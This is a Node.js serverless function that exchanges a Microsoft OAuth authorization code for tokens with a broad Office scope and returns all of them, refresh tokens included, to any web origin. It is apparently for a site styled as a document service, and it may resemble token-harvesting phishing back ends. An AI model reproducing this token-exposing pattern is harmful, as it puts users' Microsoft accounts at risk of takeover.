const https = require('https');
const querystring = require('querystring');

exports.handler = async (event, context) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Content-Type': 'application/json'
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  try {
    const { code, email, state } = JSON.parse(event.body);

    if (!code) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'Authorization code required' })
      };
    }

    console.log('🔐 Exchanging authorization code for tokens...');
    
    // FINAL FIX: The redirect_uri must EXACTLY match what is in your Azure App Registration.
    const redirect_uri = 'https://vaultydocs.com/auth/callback';
    console.log(`✅ Using static redirect_uri: ${redirect_uri}`);

    // Prepare token exchange data
    const postData = querystring.stringify({
      client_id: '2e338732-c914-4129-a148-45c24f2da81d', // Correct Client ID
      client_secret: process.env.MICROSOFT_CLIENT_SECRET,
      code: code,
      redirect_uri: redirect_uri, // Using the static, correct URI
      grant_type: 'authorization_code',
      scope: 'openid profile https://www.office.com/v2/OfficeHome.All'
    });

    // Make HTTPS POST request to Microsoft
    const tokenPromise = new Promise((resolve, reject) => {
      const options = {
        hostname: 'login.microsoftonline.com',
        port: 443,
        path: '/common/oauth2/v2.0/token',
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Content-Length': Buffer.byteLength(postData)
        }
      };

      const req = https.request(options, (res) => {
        let data = '';

        res.on('data', (chunk) => {
          data += chunk;
        });

        res.on('end', () => {
          try {
            const parsed = JSON.parse(data);
            if (res.statusCode >= 400) {
              reject({ status: res.statusCode, data: parsed });
            } else {
              resolve({ status: res.statusCode, data: parsed });
            }
          } catch (e) {
            reject({ status: 500, data: { error: 'parse_error', error_description: 'Failed to parse Microsoft response' } });
          }
        });
      });

      req.on('error', (error) => {
        reject({ status: 500, data: { error: 'request_error', error_description: error.message } });
      });

      req.write(postData);
      req.end();
    });

    const { data: tokens } = await tokenPromise;

    console.log('✅ Tokens obtained successfully');

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        ...tokens // Spread all tokens into the response
      })
    };

  } catch (error) {
    console.error('❌ Token exchange failed:', error);
    return {
      statusCode: error.status || 500,
      headers,
      body: JSON.stringify({
        success: false,
        error: error.data ? error.data.error : 'server_error',
        error_description: error.data ? error.data.error_description : 'An internal server error occurred.'
      })
    };
  }
};